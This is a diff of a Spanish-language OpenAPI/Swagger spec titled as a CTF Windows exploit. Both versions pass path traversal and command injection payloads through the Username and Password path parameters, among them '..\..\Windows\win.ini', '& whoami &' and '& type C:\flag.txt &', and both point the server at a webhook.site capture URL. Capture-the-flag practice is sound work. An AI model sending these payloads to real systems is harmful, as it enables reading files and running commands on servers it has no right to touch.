@@ -1,62 +1,38 @@
-swagger: "2.0"
+openapi: "3.0.0"
 info:
-  version: "v1"
-  title: Explotación Path Traversal / Command Injection en Windows
-
-host: webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003
-
-schemes:
-  - http
-
+  title: "CTF Windows Swagger Exploit"
+  version: "1.0.0"
+  description: |
+    Endpoint vulnerable a path traversal y/o command injection.
+servers:
+  - url: "https://webhook.site/4a8415c5-45b6-4cb3-a028-f22078db2003"
 paths:
-  /{Username}/{Password}:
+  '/{Username}/{Password}':
     post:
-      summary: Endpoint vulnerable (Path Traversal / Command Injection en Windows)
+      summary: "Explotar endpoint vulnerable"
       description: |
-        Prueba payloads de traversal y command injection en Username y Password.
-        Ejemplos comunes en Windows:
-          - ..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
-          - ..\..\..\..\..\..\Windows\win.ini
-          - & type C:\Windows\System32\drivers\etc\hosts &
-          - & dir C:\ &
-
-        También prueba comandos de Windows (con separadores como `&`, `|`, `&&`):
-
-          - & whoami &
-          - & dir C:\Users &
-          - & type C:\flag.txt &
-          - | dir C:\ |
+        Prueba payloads en Username y Password. Ejemplo:
+        - ..\..\..\..\..\..\Windows\win.ini
+        - & type C:\Windows\win.ini &
+        - & whoami &
+        - | dir C:\ |
       parameters:
         - name: Username
           in: path
           required: true
-          type: string
-          description: |
-            Prueba estos payloads, por ejemplo:
-              - ..\..\..\..\..\..\Windows\win.ini
-              - & whoami &
-              - Administrator
-              - C:\flag.txt
-              - | dir C:\ |
+          schema:
+            type: string
+          description: "Payload path traversal o command injection en Windows."
         - name: Password
           in: path
           required: true
-          type: string
-          description: |
-            También prueba traversal/injection, por ejemplo:
-              - ..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
-              - & type C:\flag.txt &
-              - 123456
+          schema:
+            type: string
+          description: "Payload path traversal o command injection en Windows."
       responses:
-        200:
-          description: Respuesta del servidor (analiza si retorna archivos o resultados de comandos)
-        400:
-          description: Solicitud malformada (puede indicar filtrado)
-        500:
-          description: Error de servidor (a veces filtra información útil)
-
-# Ejemplo de uso directo:
-# /..\..\..\..\..\..\Windows\System32\drivers\etc\hosts/abc
-# /Administrator/..\..\..\..\..\..\Windows\win.ini
-# /Administrator/&whoami&/
-# /Administrator/&type C:\flag.txt&/
+        '200':
+          description: "Respuesta del servidor"
+        '400':
+          description: "Bad Request"
+        '500':
+          description: "Internal Server Error"
